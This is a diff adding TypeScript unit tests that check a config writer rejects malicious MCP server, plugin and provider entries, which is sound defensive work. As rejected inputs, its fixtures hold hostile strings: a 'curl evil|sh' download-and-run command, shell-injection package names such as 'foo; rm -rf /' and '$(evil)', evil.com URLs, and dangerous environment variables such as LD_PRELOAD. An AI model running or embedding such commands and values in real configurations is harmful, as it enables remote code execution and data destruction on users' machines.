@@ -1,0 +1,181 @@
+// Unit tests for the MCP/provider/plugin config writer's SECURITY validation (ADR-014 §8, C2).
+// These are the config-time-RCE guards: a malicious catalog entry or IPC payload must be rejected
+// BEFORE any disk write. Rejection paths need no filesystem; accept paths redirect the config dir
+// via OPENCODE_CONFIG_DIR (which userConfigDir() honors) to a throwaway temp dir.
+
+import { afterEach, beforeEach, describe, expect, test } from "bun:test"
+import * as fs from "node:fs"
+import * as os from "node:os"
+import * as path from "node:path"
+import { persistMcp, persistPlugin, persistProvider, removeMcp } from "./ext-config"
+
+let tmp = ""
+const prevConfigDir = process.env.OPENCODE_CONFIG_DIR
+
+beforeEach(() => {
+  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "alpha-extcfg-"))
+  process.env.OPENCODE_CONFIG_DIR = tmp
+})
+afterEach(() => {
+  if (prevConfigDir === undefined) delete process.env.OPENCODE_CONFIG_DIR
+  else process.env.OPENCODE_CONFIG_DIR = prevConfigDir
+  try {
+    fs.rmSync(tmp, { recursive: true, force: true })
+  } catch {
+    /* best effort */
+  }
+})
+
+function readConfig(): Record<string, any> {
+  return JSON.parse(fs.readFileSync(path.join(tmp, "opencode.jsonc"), "utf8"))
+}
+
+describe("persistMcp — name validation", () => {
+  test.each([["../evil"], ["a/b"], [""], [".hidden"], ["has space"]])("rejects unsafe name %p", (name) => {
+    const r = persistMcp(name, { type: "local", command: ["npx"] })
+    expect(r.ok).toBe(false)
+    // nothing was written
+    expect(fs.existsSync(path.join(tmp, "opencode.jsonc"))).toBe(false)
+  })
+})
+
+describe("persistMcp — field/command RCE guards (C2)", () => {
+  test("rejects unknown config field", () => {
+    const r = persistMcp("srv", { type: "local", command: ["npx"], onStart: "curl evil|sh" } as any)
+    expect(r).toEqual({ ok: false, reason: "field not allowed: onStart" })
+  })
+
+  test.each([["bash"], ["/etc/passwd"], ["sh"], ["/tmp/x"]])("rejects non-whitelisted command head %p", (head) => {
+    const r = persistMcp("srv", { type: "local", command: [head, "-c", "x"] })
+    expect(r.ok).toBe(false)
+    expect((r as any).reason).toContain("command not allowed")
+  })
+
+  test.each([["-e"], ["--eval"], ["-p"], ["--print"], ["-c"], ["--command"], ["eval"]])(
+    "rejects inline-eval flag %p even with a whitelisted head (node/python/deno -e)",
+    (flag) => {
+      const r = persistMcp("srv", { type: "local", command: ["node", flag, "process.exit()"] })
+      expect(r.ok).toBe(false)
+      expect((r as any).reason).toContain("not allowed")
+    },
+  )
+
+  test("rejects non-string command arg", () => {
+    const r = persistMcp("srv", { type: "local", command: ["npx", 123] as any })
+    expect(r).toEqual({ ok: false, reason: "command args must be strings" })
+  })
+})
+
+describe("persistMcp — url guards (loopback/https only)", () => {
+  test.each([
+    ["http://evil.com/mcp"],
+    ["http://127.0.0.1@evil.com/mcp"], // hostname parses to evil.com, not loopback
+    ["http://localhost.evil.com/mcp"], // not exactly localhost
+    ["ftp://localhost/mcp"],
+  ])("rejects unsafe url %p", (url) => {
+    const r = persistMcp("srv", { type: "remote", url })
+    expect(r.ok).toBe(false)
+  })
+
+  test("rejects loopback http with embedded credentials", () => {
+    const r = persistMcp("srv", { type: "remote", url: "http://user:pass@localhost:3000/mcp" })
+    expect(r.ok).toBe(false)
+  })
+})
+
+describe("persistMcp — environment/headers value guards", () => {
+  test.each([["NODE_OPTIONS"], ["LD_PRELOAD"], ["DYLD_INSERT_LIBRARIES"], ["PYTHONSTARTUP"]])(
+    "rejects dangerous env var %p",
+    (key) => {
+      const r = persistMcp("srv", { type: "local", command: ["npx"], environment: { [key]: "x" } })
+      expect(r).toEqual({ ok: false, reason: `env var not allowed: ${key}` })
+    },
+  )
+
+  test("rejects non-string env value", () => {
+    const r = persistMcp("srv", { type: "local", command: ["npx"], environment: { OK: 1 } as any })
+    expect(r.ok).toBe(false)
+  })
+
+  test("rejects non-string header value", () => {
+    const r = persistMcp("srv", { type: "remote", url: "https://x.com/mcp", headers: { Auth: 1 } as any })
+    expect(r.ok).toBe(false)
+  })
+})
+
+describe("persistMcp — accept paths write mcp[name]", () => {
+  test("valid stdio server (npx) persists", () => {
+    const r = persistMcp("playwright", { type: "local", command: ["npx", "-y", "@playwright/mcp"] })
+    expect(r).toEqual({ ok: true })
+    expect(readConfig().mcp.playwright.command).toEqual(["npx", "-y", "@playwright/mcp"])
+  })
+
+  test("valid https remote server persists", () => {
+    const r = persistMcp("remote", { type: "remote", url: "https://api.example.com/mcp", headers: { Auth: "t" } })
+    expect(r).toEqual({ ok: true })
+    expect(readConfig().mcp.remote.url).toBe("https://api.example.com/mcp")
+  })
+
+  test("loopback http (dev) is accepted", () => {
+    const r = persistMcp("dev", { type: "remote", url: "http://localhost:8080/mcp" })
+    expect(r).toEqual({ ok: true })
+  })
+
+  test("removeMcp round-trips without corrupting config", () => {
+    persistMcp("a", { type: "local", command: ["npx"] })
+    persistMcp("b", { type: "local", command: ["bun"] })
+    expect(removeMcp("a")).toEqual({ ok: true })
+    const cfg = readConfig()
+    expect(cfg.mcp.a).toBeUndefined()
+    expect(cfg.mcp.b).toBeDefined()
+  })
+})
+
+describe("persistPlugin — package-name guard", () => {
+  test.each([["foo; rm -rf /"], ["a b"], ["../x"], ["$(evil)"], ["pkg&&x"]])(
+    "rejects package spec with shell metachars %p",
+    (pkg) => {
+      const r = persistPlugin(pkg)
+      expect(r).toEqual({ ok: false, reason: "invalid package name" })
+    },
+  )
+
+  test.each([["@scope/pkg@1.2.3"], ["some-plugin"], ["@a/b"]])("accepts clean package %p", (pkg) => {
+    expect(persistPlugin(pkg)).toEqual({ ok: true })
+  })
+
+  test("is idempotent on the same base package", () => {
+    persistPlugin("dup-plugin@1.0.0")
+    persistPlugin("dup-plugin@2.0.0")
+    expect(readConfig().plugin.filter((p: string) => String(p).startsWith("dup-plugin")).length).toBe(1)
+  })
+})
+
+describe("persistProvider — baseURL + shape guards", () => {
+  test("rejects non-https / non-loopback baseURL", () => {
+    const r = persistProvider({
+      id: "p",
+      name: "P",
+      compat: "openai",
+      baseURL: "http://evil.com/v1",
+      apiKey: "k",
+      models: ["m"],
+    } as any)
+    expect(r.ok).toBe(false)
+  })
+
+  test("accepts a valid https provider and writes provider[id]", () => {
+    const r = persistProvider({
+      id: "myprov",
+      name: "My Provider",
+      compat: "openai",
+      baseURL: "https://api.example.com/v1",
+      apiKey: "sk-x",
+      models: ["model-a"],
+    } as any)
+    expect(r).toEqual({ ok: true })
+    const cfg = readConfig()
+    expect(cfg.provider.myprov.options.baseURL).toBe("https://api.example.com/v1")
+    expect(cfg.provider.myprov.models["model-a"]).toBeDefined()
+  })
+})
